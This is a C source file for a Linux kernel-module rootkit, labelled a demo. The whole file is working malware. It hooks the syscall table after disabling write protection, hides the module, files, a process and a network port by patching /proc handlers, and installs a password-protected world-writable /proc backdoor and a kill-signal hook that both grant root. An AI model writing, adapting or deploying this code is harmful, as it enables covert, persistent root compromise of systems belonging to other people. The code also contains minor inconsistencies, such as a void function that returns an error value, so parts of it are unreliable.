/**
Author: Mote
File: myrootkit.c
**/
# include <linux/module.h>    
# include <linux/kernel.h>   
# include <linux/init.h>
// version
# include <linux/version.h>
// dirent, kmalloc, kfree.
# include <linux/slab.h>
// struct linux_dirent64.
# include <linux/dirent.h>
// __NR_close.
# include <linux/syscalls.h>
// copy_from_user
# include <linux/uaccess.h>
// filp_open, filp_close.
# include <linux/fs.h>
// PDE_DATA.
# include <linux/proc_fs.h>
// struct seq_file, struct seq_operations.
# include <linux/seq_file.h>
// printk.
# include <linux/printk.h>
// struct tcp_seq_afinfo.
# include <net/tcp.h> 
// PDE_DATA
# include <linux/proc_fs.h>
//__task_cred
#include <linux/cred.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mote");
MODULE_DESCRIPTION("A Simple LKM Rootkit Demo");


// ========== WRITE_PROTECTION HELPER ==========
void
disable_wp(void)
{
    unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    clear_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();

    return;
}

void
enable_wp(void)
{
    unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    set_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();

    return;
}
// ========== END WRITE_PROTECTION HELPER ==========




// ========== MODULE HIDE/UNHIDE HELPER ==========
/*
Reference：https://github.com/croemheld/lkm-rootkit/blob/master/src/module_hiding.c
*/


static struct list_head *module_previous;
static struct kernfs_node *node;
static char module_hidden = 0;

int nodecmp(struct kernfs_node *kn, const unsigned int hash, const char *name,
            const void *ns)
{
    /* compare hash value */
    if (hash != kn->hash)
        return hash - kn->hash;
    /* compare ns */
    if (ns != kn->ns)
        return ns - kn->ns;
    /* compare name */
    return strcmp(name, kn->name);
}

void rb_add(struct kernfs_node *node)
{
    struct rb_node **child = &node->parent->dir.children.rb_node;
    struct rb_node *parent = NULL;

    while (*child)
    {
        struct kernfs_node *pos;
        int result;

        /* cast rb_node to kernfs_node */
        pos = rb_entry(*child, struct kernfs_node, rb);

        /* 
		 * traverse the rbtree from root to leaf (until correct place found)
		 * next level down, child from previous level is now the parent
		 */
        parent = *child;

        /* using result to determine where to put the node */
        result = nodecmp(pos, node->hash, node->name, node->ns);

        if (result < 0)
            child = &pos->rb.rb_left;
        else if (result > 0)
            child = &pos->rb.rb_right;
        else
            return;
    }

    /* add new node and reblance the tree */
    rb_link_node(&node->rb, parent, child);
    rb_insert_color(&node->rb, &node->parent->dir.children);

    /* needed for special cases */
    if (kernfs_type(node) == KERNFS_DIR)
        node->parent->dir.subdirs++;
}


void module_show(void)
{
	if (!module_hidden) return;
	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	// recover $ lsmod
	list_add(&THIS_MODULE->list, module_previous); 
	
	// recover $ ls /sys/module/
	rb_add(THIS_MODULE->mkobj.kobj.sd);
	mutex_unlock(&module_mutex);
	module_hidden = !module_hidden;

	//printk("Mote Rootkit: module sucessfully show\n");
}

void module_hide(void)
{
	if (module_hidden) return;
	module_previous = THIS_MODULE->list.prev;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();

	//hide lsmod
	list_del(&THIS_MODULE->list);

	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;

	//hide /sys/module/
	node = THIS_MODULE->mkobj.kobj.sd;
	rb_erase(&node->rb, &node->parent->dir.children);
	node->rb.__rb_parent_color = (unsigned long)(&node->rb);

	mutex_unlock(&module_mutex);

	module_hidden = !module_hidden;
	//printk("[Motekit]: module sucessfully hide\n");
}


// ========== END MODULE HIDE/UNHIDE  HELPER ==========




// ========== SYS_CALL_TABLE ==========


// WARN: This can be cheated if someone places a faked
// but unmodified sys_call_table before the real one.
unsigned long **
get_sct_via_sys_close(void)
{
    unsigned long **entry = (unsigned long **)PAGE_OFFSET;

    for (;(unsigned long)entry < ULONG_MAX; entry += 1) {
        if (entry[__NR_close] == (unsigned long *)sys_close) {
            return entry;
        }
    }

    return NULL;
}


unsigned long **
get_sct(void)
{
    return get_sct_via_sys_close();
}



// ========== END SYS_CALL_TABLE ==========







//========== HOOK HELPER =================
unsigned long **sct;


/**
挂钩与脱钩助手宏
**/
# define HOOK_SCT(sct, name)                    \
    do {                                        \
        real_##name = (void *)sct[__NR_##name]; \
        sct[__NR_##name] = (void *)fake_##name; \
    } while (0)

# define UNHOOK_SCT(sct, name)                  \
    sct[__NR_##name] = (void *)real_##name



/**
kill钩子
**/
asmlinkage int fake_kill(pid_t pid, int sig);
asmlinkage int (*real_kill)(pid_t pid, int sig);

#define SIGROOT 48
asmlinkage int fake_kill(pid_t pid, int sig){
    switch(sig){
        case SIGROOT:
            commit_creds(prepare_kernel_cred(0));
            break;
	default:
            return real_kill(pid,sig);

    }
    return 0;
}


/**
挂钩与脱钩函数
**/
void
hook_start(void)
{
	/* No consideration on failure. */
	sct = get_sct();
	//printk("sys_call_table_addr: %p\n",sct);
	disable_wp();
	HOOK_SCT(sct, kill);
	enable_wp();
	//pr_info("%s\n", "Hook Start!");
}


void
hook_stop(void)
{
	disable_wp();
	UNHOOK_SCT(sct, kill);
	enable_wp();
	//pr_info("%s\n", "Hook Stop!");
}

//========== END HOOK HELPER =================




//========== HIDE FILE AND PROCESS MODULE =================

/*
隐藏文件和隐藏进程模块，隐藏进程模块的实现基于隐藏文件
*/
#define set_f_op(op, path, new, old)    \
    do{                                 \
        struct file *filp;              \
        struct file_operations *f_op;   \
        printk("Opening the path: %s.\n", path);    \
        filp = filp_open(path, O_RDONLY, 0);        \
        if(IS_ERR(filp)){                           \
            printk("Failed to open %s with error %ld.\n",   \
                path, PTR_ERR(filp));                       \
            old = NULL;                                     \
        }                                                   \
        else{                                               \
            printk("Succeeded in opening: %s.\n", path);    \
            f_op = (struct file_operations *)filp->f_op;    \
            old = f_op->op;                                 \
            printk("Changing iterate from %p to %p.\n",     \
                    old, new);                              \
            disable_wp();                     \
            f_op->op = new;                                 \
            enable_wp();                      \
        }                                                   \
    }while(0)

# define ROOT_PATH "/proc/"
# define SECRET_FILE "Hidden_"
# define PROCESS_ROOT_PATH 
# define SECRET_PROC 8056	

int 
(*real_iterate_shared)(struct file *, struct dir_context *); 
int 
(*real_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
int
fake_iterate_shared(struct file *filp, struct dir_context *ctx);
int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned d_type);

int fake_iterate_shared(struct file *filp, struct dir_context *ctx)
{
    // 备份真的 ``filldir``，以备后面之需。
    real_filldir = ctx->actor;
    // 把 ``struct dir_context`` 里的 ``actor``，
    // 也就是真的 ``filldir``
    // 替换成我们的假 ``filldir``
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate_shared(filp, ctx);
}

int fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    if (strncmp(name, SECRET_FILE, strlen(SECRET_FILE)) == 0) {
        // 如果是需要隐藏的文件，直接返回，不填到缓冲区里。
        printk("Hiding: %s", name);
        return 0;
    }
    char *endp;
    long pid;

    // 把字符串变成长整数。
    pid = simple_strtol(name, &endp, 10);
	//printk("%s",name);
    if (pid == SECRET_PROC) {
        // 是我们需要隐藏的进程，直接返回。
        printk("Hiding pid: %ld", pid);
        return 0;
    }
    // 如果不是需要隐藏的文件和进程，
    // 交给的真的 ``filldir`` 把这个记录填到缓冲区里。
    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}

void hide_file_and_process_start(void)
{
	set_f_op(iterate_shared, ROOT_PATH, fake_iterate_shared, real_iterate_shared);
	if(!real_iterate_shared){
	    return -ENOENT;
	}
}

void hide_file_and_process_stop(void)
{
	if(real_iterate_shared){
		void *dummy;
		set_f_op(iterate_shared, ROOT_PATH, real_iterate_shared, dummy);
	}
}

//========== END HIDE FILE AND PROCESS MODULE =================









//========== HIDE PORT MODULE =================


#define set_afinfo_seq_op(op, path, afinfo_struct, new, old)    \
    do{ \
        struct file *filp;  \
        afinfo_struct *afinfo;  \
        filp = filp_open(path, O_RDONLY, 0);    \
        if(IS_ERR(filp)){   \
            printk("Failed to open %s with error %ld.\n",   \
                    path, PTR_ERR(filp));   \
            old = NULL; \
        }   \
        else{   \
                afinfo = PDE_DATA(filp->f_path.dentry->d_inode);    \
                old = afinfo->seq_ops.op;   \
                printk("Setting seq_op->" #op " from %p to %p.",    \
                        old, new);  \
                afinfo->seq_ops.op = new;   \
                filp_close(filp, 0);    \
        }   \
    }while(0)


# define NEEDLE_LEN  6
# define SECRET_PORT 10000
# define TMPSZ 150
# define NET_ENTRY "/proc/net/tcp"
# define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo

int fake_seq_show(struct seq_file *seq, void *v);
int (*real_seq_show)(struct seq_file *seq, void *v);
int fake_seq_show(struct seq_file *seq, void *v) 
{
    int ret;
    char needle[NEEDLE_LEN];
    snprintf(needle, NEEDLE_LEN, ":%04X", SECRET_PORT);
    ret = real_seq_show(seq, v); 

    if(strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)){
        printk("Hiding port %d using needle %s.\n", \
                SECRET_PORT, needle);
        seq->count -= TMPSZ;
    }   
    return ret;
}

void hideport_start(void)
{
	set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, fake_seq_show, real_seq_show);
}

void hideport_stop(void)
{
	if(real_seq_show){
		void *dummy;
		set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, real_seq_show, dummy);
	}
}

//========== END HIDE PORT MODULE =================


//========== GET ROOT PRIVILEDGE =================



#define BACKDOOR_NAME "MOTE"
// create file in /proc/   with proc_create and proc_remove
struct proc_dir_entry *entry;

// 声明写处理函数并放入结构体
ssize_t
write_handler(struct file * filp, const char __user *buff,
              size_t count, loff_t *offp);

struct file_operations proc_fops = {
    .write = write_handler
};

// 定义写处理函数
#define AUTH "GiveMeTheRoot!"
ssize_t
write_handler(struct file * filp, const char __user *buff,
              size_t count, loff_t *offp)
{
    char *kbuff;
    struct cred* cred;

    // 分配内存。
    kbuff = kmalloc(count + 1, GFP_KERNEL);
    if (!kbuff) {
        return -ENOMEM;
    }

    // 复制到内核缓冲区。
    if (copy_from_user(kbuff, buff, count)) {
        kfree(kbuff);
        return -EFAULT;
    }
    kbuff[count] = (char)0;

    if (strlen(kbuff) == strlen(AUTH) &&
        strncmp(AUTH, kbuff, count) == 0) {

        // 用户进程写入的内容是我们的口令或者密码，
        // 把进程的 ``uid`` 与 ``gid`` 等等
        // 都设置成 ``root`` 账号的，将其提权到 ``root``。
        printk("%s\n", "Comrade, I will help you.");
        cred = (struct cred *)__task_cred(current);
        cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
        cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
        printk("%s\n", "See you!");
    } else {
        // 密码错误，拒绝提权。
        printk("Alien, get out of here: %s.\n", kbuff);
    }

    kfree(kbuff);
    return count;
}

void set_priviledge_backdoor(void)
{
	entry = proc_create(BACKDOOR_NAME, S_IRUGO | S_IWUGO, NULL, &proc_fops);
}

void clean_priviledge_backdoor(void)
{
	proc_remove(entry);	
}

//========== END GET ROOT PRIVILEDGE =================






//========== ROOTKIT START =================
static int __init myrootkit_init(void)
{
	
	set_priviledge_backdoor();
	hideport_start();
	hide_file_and_process_start();
	return 0;
}

static void __exit myrootkit_exit(void)
{
	
	clean_priviledge_backdoor();
	hideport_stop();
	hide_file_and_process_stop();
}


//========== END ROOTKIT START =================


module_init(myrootkit_init);
module_exit(myrootkit_exit);

